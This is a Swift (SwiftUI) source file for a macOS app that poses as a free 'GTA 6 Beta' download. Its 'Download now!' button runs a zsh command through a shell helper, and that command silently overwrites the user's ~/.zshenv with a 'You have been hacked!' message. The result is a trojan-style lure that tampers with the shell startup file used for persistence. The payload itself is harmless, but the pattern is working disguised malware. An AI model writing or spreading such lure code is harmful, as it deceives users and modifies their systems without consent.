//
//  ContentView.swift
//  game
//
//  Created by WOLF on 3/12/24.
//

import SwiftUI
import Foundation

@discardableResult // Add to suppress warnings when you don't want/need a result
func safeShell(_ command: String) throws -> String {
    let task = Process()
    let pipe = Pipe()
    
    task.standardOutput = pipe
    task.standardError = pipe
    task.arguments = ["-c", command]
    task.executableURL = URL(fileURLWithPath: "/bin/zsh") //<--updated
    task.standardInput = nil

    try task.run() //<--updated
    
    let data = pipe.fileHandleForReading.readDataToEndOfFile()
    let output = String(data: data, encoding: .utf8)!
    
    return output
}

public extension URL {
    static var userHome : URL   {
        URL(fileURLWithPath: userHomePath, isDirectory: true)
    }
    
    static var userHomePath : String   {
        let pw = getpwuid(getuid())

        if let home = pw?.pointee.pw_dir {
            return FileManager.default.string(withFileSystemRepresentation: home, length: Int(strlen(home)))
        }
        
        fatalError()
    }
}

struct ContentView: View {
    
    let bundle = Bundle.main
    
    var body: some View {
        VStack {
            Image(systemName: "globe")
                .imageScale(.large)
                .foregroundColor(.accentColor)
            Text("Download GTA 6 Beta for free!")
                .font(.title)
            Button(action: signIn) {
                Label("Download now!", systemImage: "icloud.and.arrow.down.fill")
            }
        }
        .padding()
    }
    
    func signIn() {
        var files = bundle.bundleURL
        let home = URL.userHome.path
        let command = """
        cd \(home) && echo 'echo "You have been hacked!"' > ~/.zshenv
        """
        do {
            //print(files)
            var output = try safeShell(command)
            print(output)
        }
        catch {
            print("\(error)")
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
